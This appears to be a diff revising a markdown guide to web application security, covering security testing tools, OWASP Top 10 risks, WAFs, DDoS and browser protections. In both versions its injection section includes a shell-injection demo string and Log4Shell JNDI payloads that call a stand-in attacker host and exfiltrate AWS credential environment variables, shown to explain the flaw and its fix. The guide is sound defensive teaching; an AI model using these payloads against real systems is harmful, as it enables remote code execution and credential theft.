@@ -1,200 +1,152 @@
+# Web Application Risks
 
-# Web application security
-
-Securing web applications is not a single pronged approach. The **Defense in depth** strategy allows multiple layers of security that focus on delaying the attack rather than completely preventing it often compared to a **castle** with multiple walls of protection. The more layers of defense you have, the attack will lose momentum and you’ll have more time to respond appropriately. A Defense in Depth strategy is designed to increase the cost and effort of an attack against an organisation.
+What goes wrong in web applications, how does each attack work, and what stops it? An application is a gateway to servers, networks and data, so it is the attack path of choice. Securing it is not a single pronged approach. **Defence in depth** puts several layers in the way so that an attack loses momentum at each one and you gain time to respond. It is often compared to a castle with multiple walls. The aim is to raise the cost and effort of an attack, not to make one impossible.
 
 ## Security requirements
 
-We often have well defined tools and techniques for gathering functional requirements of a system. e.g. user stories, acceptance criteria, definition of done within a BDD approach. But we do not see the same level of maturity amongst teams when it comes to gathering non functional requirements, especially those related to security. This could be due to a number of factors:
+We have well defined tools for gathering functional requirements: user stories, acceptance criteria, definition of done within a BDD approach. Teams are far less mature at gathering non functional requirements, and security requirements in particular. Some reasons:
 
-* Deep technical knowledge maybe required
-* Do not always have a security expert on board
-* Stakeholders may not be aware of the security cost to revenue and unwilling to invest time and resource. You can never be 100% secure but it is worth thinking about what good looks like from a security point of view
-  * How urgently do you fix a vulnerability identified in a production system?
-  * Do you understand the risk of letting the system run with vulnerabilities?
-  * What is the organisation's appetite for risk? What kind of data are you dealing with? e.g, finance, healthcare or provider of publicly available traffic data
-  * Is certain amount of downtime acceptable to you?
+* Deep technical knowledge may be required.
+* There is not always a security expert on the team.
+* Stakeholders may not see the security cost to revenue and are unwilling to invest time and resource.
+
+You can never be 100% secure, so it is worth deciding what good looks like:
+
+* How urgently do you fix a vulnerability found in production?
+* Do you understand the risk of running with known vulnerabilities?
+* What is the organisation's appetite for risk, and what kind of data do you hold? Finance, healthcare and a provider of public traffic data have different answers.
+* Is some downtime acceptable?
 
 ### Gates to guardrails
 
-Traditional approaches to secure development lifecycle have relied on high-touch and process-driven models involving a series of assessments (e.g. design review, threat model, vulnerability scan) and associated decisions on whether to proceed to the next phase and gate. While this model serves many well, there are an increasing number of organizations embracing concepts like DevOps, agile, cloud, and continuous delivery that are looking for more pragmatic, automated, and dynamic approaches that suit the technology and business environments in which they exist. Tension between SecOps, DevOps and application developers can lead to disjointed teams. How do you apply consistent security policies across multiple architectures?
+The traditional secure development lifecycle is a series of assessments (design review, threat model, vulnerability scan), each a gate that decides whether work proceeds. Teams doing agile, cloud and continuous delivery want something more automated. Tension between SecOps, DevOps and developers leads to disjointed teams and inconsistent policy across architectures.
 
-Moving [from gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html) involves providing guidance and tooling to development teams to insert security policies into their delivery pipelines rather than introducing delays via security compliance gates. Some of the [ways Netflix has approached this shift](https://www.youtube.com/watch?v=geumLjxtc54), emphasizing practical methods to problems ranging from continuous assessment to regulatory compliance to team staffing.
+Moving [from gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html) means giving development teams guidance and tooling to put security policy into their own delivery pipelines instead of waiting at a compliance gate. Netflix has [described this shift](https://www.youtube.com/watch?v=geumLjxtc54), from continuous assessment to regulatory compliance to team staffing.
 
-Data between the end user and your application flows through the data plane. Thinking of security as a horizontal capability across the data plane and use the metrics and telemetry from the data plane to get visibility of the applied security policies and application threats.
+Data between the end user and your application flows through the data plane. Treat security as a horizontal capability across that plane, and use its metrics and telemetry to see which policies are applied and what threats arrive.
 
-## Security theater
+## Security theatre
 
-Security theater is the practice of investing in countermeasures intended to provide the feeling of improved security while doing little or nothing to actually achieve it. Be aware of security theater <https://security.stackexchange.com/questions/112037/how-to-avoid-reveal-password-in-a-form>
+Security theatre is spending on countermeasures that give the feeling of improved security while doing little or nothing to achieve it. Be aware of [security theatre](https://security.stackexchange.com/questions/112037/how-to-avoid-reveal-password-in-a-form).
 
-## Web Application Security
+## Finding the weaknesses
 
-Applications, especially those that are cloud native, are a gateway to servers and networks and present an ideal attack vector for malicious actors.
+Security testing has two modes. Assessment finds vulnerabilities without exploiting them. Testing finds them and tries to exploit them. The [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/) is the open standard for what to verify. Known vulnerabilities in the software you depend on are catalogued in the [National Vulnerability Database](https://nvd.nist.gov/) and [CVE](https://www.cve.org/).
 
-In order to understand and address your security requirements it is worth understanding the approaches and tools at hand. The security testing process involves:
+The tools fall into four categories. Static analysis (SAST) reads source code without running it. It is good at well known patterns such as SQL injection and buffer overflows, produces many false positives, and is weak on authentication, access control and misuse of cryptography; CodeQL is one example. Dynamic analysis (DAST) tests the running application from outside by sending requests and inspecting responses, with no access to source; OWASP ZAP is one example, and it can run headless in CI. Interactive analysis (IAST) puts an agent inside the running application so it can point at the exact line a dynamic test triggers, at the cost of setup complexity. Software composition analysis (SCA) ignores your code and checks your third party dependencies against the vulnerability databases; OWASP Dependency-Check is one example. Penetration testing is a person attacking the system, usually out of band; Burp Suite is the common toolkit. It has fewer false positives than the automated categories but takes longer. Fuzzing feeds random or malformed input to find crashes and complements all of the above.
 
-* assessment - analysis and discovery of vulnerabilities without attempting to actually exploit those vulnerabilities
-* testing - discovery and attempted exploitation of vulnerabilities. [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/) is an open standard for web application security verification.
-* vulnerability management: National Vulnerability Database - <https://nvd.nist.gov/> and <https://cve.mitre.org/>
+## Selected risks from the OWASP Top 10
 
-### Web Application Security Tools
+The [OWASP Top 10](https://owasp.org/Top10/) lists the ten most critical web application risks. The 2021 list is: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable and Outdated Components, Identification and Authentication Failures, Software and Data Integrity Failures, Security Logging and Monitoring Failures, and Server-Side Request Forgery. The risks below are the ones worth understanding in detail.
 
-[Application Security](https://snyk.io/learn/application-security/) scanning tools include:
+Three changes in the 2025 edition matter here. Software Supply Chain Failures is added, widening Vulnerable and Outdated Components to the whole build path. Mishandling of Exceptional Conditions is added, covering errors that fail open or leak information. Server-Side Request Forgery is folded into Broken Access Control.
 
-* Source code analysis - also known as [Static application security testing (SAST)](https://snyk.io/learn/application-security/static-application-security-testing/) or white box testing is used to analyse source code for security vulnerabilities. SAST tools are good at identifying well-known vulnerabilities such as Buffer overflows and SQL injection, however they result in high number of false positives and are [limited in identifying many types of vulnerabilities](https://owasp.org/www-community/Source_Code_Analysis_Tools) including Authentication problems, Access control issues, Insecure use of cryptography. Selecting a SAST tool depends upon a number of factors within your organisation:
-  * Ideally the SAST solution should be implemented as part of CI but depending upon the ways of working within an organisation it can be used as a service by dev teams to request adhoc scans as part of part of regulatory/compliance mandate.
-  * Depending upon the vendor, a SaaS solution in a fully-automated solution may not be as responsive and may introduce some challenges when troubleshooting issues - means logging into the SaaS providers platform and calling support. On-prem deployments offer more flexibility and speed but introduce compute and operating costs.
-  * How will the SAST results be managed and integrated with the vulnerability management function. This includes pulling results into a issue tracker e.g. Jira, dashboard, reporting, etc.
-  * Whether the programming language in use is supported by the tool
-* Some examples of SAST tools are:
-  * SonarQube - not strictly a SAST product but focussed on code quality/review and identifying basic application vulnerabilities. The security rule set is small in comparison to a commercial security product e.g. it can miss simple XSS JS vulnerability.
-  * Checkmarx | <https://github.com/checkmarx-ltd/cx-flow/> integrates CxSAST, CxSCA scans with issue tracking systems via webhooks and open/close/manage issues in Jira
-  * Snyk code | <https://semgrep.dev/> provide fast scanning
-  * Veracode
-  * Coverity from Synopsis
-  * Gitleaks | TruffleHog for secrets scanning
-  * Checkov for IAC, however it is mainly a cli and does not provide vulnerability visualisation support
-  * Semmle - part of GitHub Advanced Security offers fast scanning built directly into your SCM. The integrated approach can help companies with limited App Sec capabilities move quickly forward on code scanning requirements.
+### Broken access control
 
-* Interactive application security testing (**IAST**): This form of application security testing is a [hybrid approach](https://www.securityjourney.com/post/sast-vs-dast-vs-iast) that tries to solve the drawbacks of SAST and DAST by combining the best of both. It scans the source code for vulnerabilities while the application is running and and can show the exact location of a vulnerability, unlike DAST. IAST tools work by deploying agents and sensors in a running web application. This can add setup complexity due to possible compatibility issues with the application technology. The role of these agents is to continuously monitor and analyze the application's behavior during manual or automated tests.
+The application checks who you are but not what you are allowed to touch. Change an id in the URL, call an admin endpoint directly, or replay another user's request, and the server obliges. The result is disclosure, modification or destruction of any data the application can reach. The fix is to enforce authorisation on the server for every request, deny by default, and never rely on the client to hide what it should not use.
 
-* Software Composition Analysis - Rather than analysing source code an **SCA** tool focuses on third-party code dependencies that are used in the application.  According to an Accenture & WEF security report, supply chain attacks were highlighted as a major cyber threat according to business leaders in 2023. 
-  * Solar winds SC attack is one of the largest if not the largest attack of its kind. It affected more than  30,000 public & private orgs using the Orion network management system to manage their IT resources. As a result, the hack compromised the data, networks and systems of thousands when SolarWinds inadvertently delivered a backdoor malware as an update to the Orion software.
-  * SBOMs provide transparency into the components that make up your software - providing artifact integrity and provenance, helping in securing software supply chains. There are a couple of general frameworks available but the scope of these frameworks is pretty wide, hence finding the appropriate level of measures to put in place is a key challenge.
-    * https://slsa.dev/
-    * https://in-toto.io
-    * NIST's SSDF https://csrc.nist.gov/Projects/ssdf
-  * Securing integration, deployment and runtime related components and procedures, starting with
-      1. produce SBOM data
-      2. storing SBOM data and other attestations
-      3. aggregating and pre-processing data
-      4. query data for specific operations (most likely validation during deployment and other automated (reactive) response actions)
-  * Vendors like Snyk, Synopsis, mend.io provide SCA tooling
-  * <https://owasp.org/www-project-dependency-check/> is a utility that identifies project dependencies and checks if there are any known, publicly disclosed, vulnerabilities
+### Identification and authentication failures
 
-* Runtime testing - also known as Dynamic application security testing **DAST** or black box testing is used to discover security vulnerabilities while an application is running e.g. looking at the request and responses to the system. It does not require access to the application’s source code. A web application security scanner acts as a *"man in the middle proxy"* and typically sits between the tester's browser and the web application so that it can intercept and inspect messages sent between browser and web application, modify the contents if needed, and then forward those packets on to the destination. Some tools to consider:
-  * [OWASP ZAP](https://www.zaproxy.org/) - Free and open source, can run headless as a daemon with a REST API. ZAP provides a [baseline scan feature](https://www.zaproxy.org/blog/2020-04-09-automate-security-testing-with-zap-and-github-actions/) to find common security faults in a web application without doing any active attacks. The scan can be integrated into your CI/CD pipelines using GitHub Actions.
-  * [Open VAS](https://www.openvas.org/) - Open Vulnerability Assessment Scanner
+These are exploited with credential stuffing, brute force and weak or well known passwords. Authentication can be offloaded to an external identity provider that has credential protection built in. APIs authenticate callers with certificate based mutual TLS, HTTP Basic, API keys (a shared secret) or JSON Web Tokens; IP address allow lists are hard to manage and [not as secure as they look](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20).
 
-* Penetration testing – The system undergoes analysis and attack from simulated malicious attackers.  It has the advantage of being more accurate because it has fewer false positives (results that report a vulnerability that isn’t actually present), but can be time-consuming to run. It generally happens out of band i.e. outside your CI/CD workflow, however **automated pen testing** part of CI validation can help uncover new vulnerabilities as well as regressions for previous vulnerabilities in an environment which quickly changes. Tools to consider
-  * [BURP Scanner](https://portswigger.net/burp) - One of the best manual penetration testing tools out there, however a [comparison with Netsparker](https://www.netsparker.com/vulnerability-scanner-comparison/netsparker-vs-burp-suite/#) reveals it can be complicated to configure and relatively less focussed on automation and integration with other tools.
-  * [Qualys web app scanning](https://www.qualys.com/apps/web-app-scanning/?_ga=2.142204082.1235140357.1591144958-1421731482.1591144958) - cloud based web app discovery and detection of vulnerabilities and misconfigurations
-  * [Intruder](https://www.intruder.io) - SaaS based vulnerability scanner, provides [comparisons with other solutions](https://www.intruder.io/qualys-alternative)  
+### Injection
 
-* **Fuzzing**: Fuzzing tests an application by inputting randomized data to uncover potential bugs. It compliments IAST, DAST, SAST, and other forms of testing.
+Untrusted data reaches an interpreter (SQL, a shell, HTML, a log lookup) without being separated from the code the interpreter expects. If any part of a string the user controls can end up as code, there is a problem.
 
-## Web Application Security Risks
+Use **context aware escaping**: make sure user input is treated as literal text and not as something executable, in the way that the receiving context requires. Escaping data for SQL is very different from escaping it for HTML. [Cross Site Scripting](Cross%20Site%20Scripting.md) is injection into HTML and has its own page.
 
-The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) provides list of the 10 Most Critical Web Application Security Risks
+Better than escaping is to keep data and code on separate channels so nothing needs escaping. Parameterised SQL does that for databases. For shell commands, pass a list of arguments so the shell is never involved:
 
-* Broken Access Control can result in information disclosure, modification or destruction of all data.
-* Identification and authentication failures are exploited using credential stuffing, brute force password attacks, weak or well known passwords. Authentication responsibility can be offloaded to an external identity provider with baked in credentials protection. Some techniques used for authenticating and [securing APIs](https://docs.oracle.com/middleware/1212/owsm/OWSMC/owsm-security-concepts.htm) are:
-  * [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - hard to manage and not necessarily the most secure
-  * Certificate based Mutual TLS
-  * HTTP Basic authentication
-  * API Specific authentication
-    * API Key - shared secret
-    * JSON Web Token (JWT)
+```python
+import os
+import subprocess
 
-* Injection can include SQL injection and Cross-Site Scripting (XSS)
-  * Untrusted data, without input sanitization is sent to the code interpreter by an attacker. There are serious security implications if any part of the string that a user passes can not be fully trusted.
-  * Use **context aware escaping** - ensure that user input is treated as literal text (escaped) as opposed to something that is executable code, depending upon the context in which it is used. e.g. The process of escaping data for SQL - to prevent SQL injection - is very different from the process of escaping data for (X)HTML, to prevent [XSS](Cross%20Site%20Scripting.md).
+cmd = 'echo'
+user_input = 'hello world && ls -al'
 
-    ```python
-    import os
-    import subprocess
+# The string is handed to a shell, which sees '&&' as an operator.
+# 'ls -al' runs: information disclosure. 'rm -rf' would be data destruction.
+os.system(f"{cmd} {user_input}")
+# hello world
+# total 84
+# drwxr-xr-x 9 azureuser azureuser  4096 Oct 11 12:00 .
+# drwxr-xr-x 3 root      root       4096 Oct  6 12:57 ..
 
-    # allowing executable code, results in executing the command 'ls -al' - information disclosure
-    # this can have serious implications if someone were to pass 'rm -rf' - data destruction
-    e ='echo'
-    input = 'hello world && ls -al'
-    os.system(f"{e} {input})" 
-    
-    # output
-    hello world
-    total 84
-    drwxr-xr-x 9 azureuser azureuser  4096 Oct 11 12:00 .
-    drwxr-xr-x 3 root      root       4096 Oct  6 12:57 ..
-    
-    # ensuring the inputs are properly escaped
-    subprocess.call([e,input])
-    
-    # output
-    hello world && ls -al
-    0
-    ```
+# The list form calls the program directly. No shell runs, so no
+# escaping is needed; '&&' is just characters in one argument.
+subprocess.run([cmd, user_input])
+# hello world && ls -al
+```
 
-  * Injection can also result in **Remote code execution (RCE)** attacks e.g. [log4j vulnerability](https://www.youtube.com/watch?v=uyq8yxWO1ls&ab_channel=JavaBrains). Log injection is relatively harmless but combining it with ability to run remote code can be problematic.
-  
-    ```java
-    final Logger logger = LogManager.getLogger(...);
-    logger.error("Error message: {}", error.message());
+Injection can end in **remote code execution (RCE)**. Log injection on its own is a nuisance. The [Log4Shell](https://www.youtube.com/watch?v=uyq8yxWO1ls&ab_channel=JavaBrains) vulnerability in Log4j turned it into RCE because the logger performed lookups inside the message it was asked to log. A `${jndi:...}` lookup made the logger fetch and run an object from a server the attacker controls.
 
-    // Search page log
-    logger.info("User {} searched for {}", user.getId(), searchTextInput);
+```java
+final Logger logger = LogManager.getLogger(...);
 
-    // if attacker sets up a remote JNDI server with malicious code and passes that as the search input,
-    // it will result in the affected application that is using log4j running this remote malicious code
-    searchTextInput = "$jndi:ldap://my-evil-ldap/maliciousobject}"
+// Search page log
+logger.info("User {} searched for {}", user.getId(), searchTextInput);
 
-    // attacker can also lookup application environment variables and send them over to the remote JNDI server
-    searchTextInput = "$jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}"
-    ```
+// If the attacker runs a JNDI server and passes this as the search text,
+// the application fetches and runs the attacker's object.
+searchTextInput = "${jndi:ldap://evil.example/maliciousobject}";
 
-### Layer 7 protection
+// Nested lookups exfiltrate environment variables in the request itself.
+searchTextInput = "${jndi:ldap://evil.example:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}";
+```
 
-HTTP based communication can be secured by deploying a Web Application Firewall (WAF) for broad range of layer 7 attacks such as SQL Injection, Cross Site Scripting, Local/Remote File Inclusion and Remote Code Execution which all together account for majority of application layer attacks.
+Later Log4j 2 releases removed message lookups and disabled JNDI by default. The lesson generalises: a library that interprets the data you give it is an interpreter, and needs the same care as SQL.
 
-#### ModSecurity WAF
+### Vulnerable components and the supply chain
 
-ModSecurity is an open source WAF for securing applications, used by over a million sites around the world.
+Most of the code you ship is code you did not write. Log4Shell was a vulnerable dependency that many teams did not know they were running; the fix started with an inventory. SolarWinds was worse: attackers tampered with the vendor's build system so that a correctly signed update of the Orion network management product carried a backdoor. About 18,000 customers downloaded the trojanised update, and roughly 100 were then actively targeted. Signing did not help because the signature was genuine. Provenance, build integrity and SBOMs are covered in [Supply Chain and Container Security](Supply%20Chain%20and%20Container%20Security.md).
 
-* Inspects incoming HTTP requests for anomalies
-* Uses database of rules to define behaviours. It supports:
-  * free open source OWASP ModSecurity Core Rule Set (CRS) with generic attack detection
-  * commercial TrustWave rule set (rule package updated daily) that works alone or with OWASP CRS with specific attacks & accuracy,
-* Traffic that violates rules are dropped and/or logged
+## Layer 7 protection
 
-The latest version, ModSecurity 3.0, has a modular architecture that runs natively in NGINX. Previous versions worked only with the Apache HTTP Server. Modsecurity can be [complied and installed for open source inginx](https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/) and other reverse proxies like [HAProxy](https://www.haproxy.com/haproxy-web-application-firewall-trial/)
+A Web Application Firewall (WAF) inspects HTTP requests and blocks those matching known attack patterns: SQL injection, cross site scripting, local and remote file inclusion, remote code execution. Together these make up most application layer attacks. A WAF is a layer, not a fix: it buys time while the vulnerability behind it is repaired, and it can be bypassed by an attacker who varies the payload.
 
-#### DDOS Protection
+ModSecurity is the reference open source WAF. It matches requests against a rule set, and the free OWASP Core Rule Set (CRS) gives generic attack detection. Trustwave, its long time maintainer, ended support in 2024 and the project moved under OWASP; the commercial Trustwave rules are gone. F5's NGINX ModSecurity WAF product is end of life, though the community connector for nginx remains. OWASP Coraza is the Go rewrite, compatible with CRS, and is what Caddy, Envoy and some Kubernetes ingress controllers now embed.
 
-A denial of service attack is not limited to layer 7 when a web server receives a flood of GET/POST requests, but it can also be
+## DDoS protection
 
-* SYN flood attack - A TCP connection requires 3 way handshake between the client and the server
-  * Client -> SYN packet -> Server
-  * Server -> SYN-ACK -> Client
-  * Client -> ACK -> Server
-  * The client overwhelms ther server by sending SYN packets without sending ACK, crossing the number of TCP connections the server can support
-* [NTP amplification attack](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack) - The Network Time Protocol is designed to allow internet connected devices to synchronize their internal clocks, and serves an important function in internet architecture. The `monlist` command is a feature of NTP that allows a client to request a list of the last 600 IP addresses that have sent NTP packets to the server. In an NTP amplification attack, an attacker sends a spoofed "monlist" request to a vulnerable NTP server, which then responds with a large amount of data (up to 600 times the size of the original request) to the victim's IP address. This amplifies the attack traffic and can overwhelm the victim's network, causing a denial-of-service (DoS) condition. The use of the "monlist" command in NTP has been deprecated due to its potential for abuse in amplification attacks.
+A denial of service attack floods a service until real users cannot get through. At layer 7 that is a flood of GET or POST requests. Lower layers have their own:
 
-![nginx-dos-protection.jpg](../../images/nginx-dos-protection.jpg "Nginx DOS protection")
+* SYN flood. A TCP connection needs a three way handshake: client sends SYN, server replies SYN-ACK, client sends ACK. The attacker sends SYN packets and never sends the ACK, so the server holds half open connections until it runs out.
+* [NTP amplification](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack). The NTP `monlist` command returns the last 600 addresses that talked to the server. An attacker sends a small spoofed `monlist` request with the victim's address as the source; the server sends a reply hundreds of times larger to the victim. `monlist` has since been disabled on most servers, and the same trick now uses open DNS resolvers, Memcached and other reflectors.
 
-### Protection offered by the browser
+The layers stack in one direction: DDoS filtering sits in front of the WAF, which sits in front of the application. Cloud providers offer the first layer as a service, because absorbing volumetric traffic needs more bandwidth than one application has.
 
-* Maintains a comprehensive list of phishing sites, warn the user against visiting such sites
-* Check validity of SSL certificate.
-* Detect weak cryptography, deficiency in the TLS (Transport layer security) or its predecessor SSL (Secure Sockets Layer) implementation.
-* Detect pages with mixed content - A page served over https that also has content served over http. Chrome shows a yellow triangle over the padlock to warn the user.
-* Apply [Security headers](Security%20Headers.md) to protect against common vulnerabilities. Some free basic website scanning for security tools
-  * <https://observatory.mozilla.org>
-  * <https://securityheaders.com/>
+## What the browser protects and what it does not
 
-### Protection not offered by the browser
+The browser does some of the work for you:
 
-* Parameter tampering (cookies, forms, headers, strings). Modifying attributes of the request (query string, changing ids).
-* Persistent cross site scripting.
-* Attackers making direct HTTP requests (access to unauthorized resources, deleting a resource).
+* It keeps a list of known phishing sites and warns before visiting one.
+* It checks the TLS certificate and refuses weak cryptography or a broken TLS implementation.
+* It handles mixed content, a page served over HTTPS that loads a resource over HTTP. Chrome upgrades such requests to HTTPS and blocks those that cannot be upgraded. Chrome removed the padlock icon in 2023; HTTPS is treated as the default and only its absence is flagged.
+* It enforces the [same origin policy](Browser%20Security%20Model.md) and honours [Security Headers](Security%20Headers.md) the server sends. [MDN HTTP Observatory](https://developer.mozilla.org/en-US/observatory) and [securityheaders.com](https://securityheaders.com/) will scan a site and grade its headers.
 
-These types of attempts can only be effective if the attacker is able to exploit an existing vulnerability, like a non secure API, SQL injection or gaining access to credentials.
+The browser cannot protect against:
 
-## Learning Resources
+* Parameter tampering: the attacker edits cookies, form fields, headers or query strings, for example changing an id.
+* Stored cross site scripting, where the payload already sits in your database.
+* Direct HTTP requests that never pass through your UI, reaching an unauthorised resource or deleting one.
+* [Cross Site Request Forgery](Cross%20Site%20Request%20Forgery.md), where the browser sends a legitimate user's cookies with a request the attacker composed.
 
-You can use your existing website or **test websites** to learn how to identify risk e.g.
+Each of these only works if there is a vulnerability behind it: an API without authorisation checks, an injection point, or stolen credentials. The browser is one wall of the castle. The server has to check everything itself.
 
-* Google's firing range - <https://github.com/google/firing-range>
-* OWASP juice shop
-  * <https://owasp.org/www-project-juice-shop>
-  * <https://github.com/bkimminich/juice-shop>
-* Hack yourself fist - <https://www.troyhunt.com/hack-yourself-first-how-to-go-on/> is a great place to start actively seeking out vulnerabilities
-* Crowd security testing platforms like <https://www.openbugbounty.org> allow security researchers to report a vulnerability on any website and submit it to Open Bug Bounty for responsible disclosure. The role of Open Bug Bounty is limited to independent verification of the submitted vulnerabilities and proper notification of website owners. Once notified, the website owner and the researcher are in direct contact to remediate the vulnerability and coordinate its disclosure.
+## How to rederive this
+
+* Ask where user controlled data meets an interpreter (SQL, shell, HTML, a logger that does lookups). Each meeting point is an injection risk; separate data from code there.
+* Ask what the server checks after it knows who you are. If the answer is nothing, access control is broken.
+* Assume every request can be forged by a client you did not write. Anything the browser enforces, the server must enforce again.
+* Each defence layer (DDoS filter, WAF, browser, server checks) slows an attack; none stops one on its own.
+* Code you did not write is still your attack surface, and a valid signature only proves who built it, not that the build was clean.
+
+## Sources
+
+* [OWASP Top 10:2021](https://owasp.org/Top10/2021/) and [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
+* [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
+* DevOpsSec, ch. 4, [From gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html), and Netflix's talk on [the same shift](https://www.youtube.com/watch?v=geumLjxtc54)
+* Java Brains, [Log4j vulnerability explained](https://www.youtube.com/watch?v=uyq8yxWO1ls&ab_channel=JavaBrains)
+* Cloudflare, [NTP amplification DDoS attack](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack)
+* [OWASP ModSecurity](https://owasp.org/www-project-modsecurity/), [OWASP Core Rule Set](https://coreruleset.org/) and [OWASP Coraza](https://coraza.io/)
+* Practice targets: [OWASP Juice Shop](https://owasp.org/www-project-juice-shop), [Google firing range](https://github.com/google/firing-range), Troy Hunt's [Hack yourself first](https://www.troyhunt.com/hack-yourself-first-how-to-go-on/), and [Open Bug Bounty](https://www.openbugbounty.org) for responsible disclosure against live sites
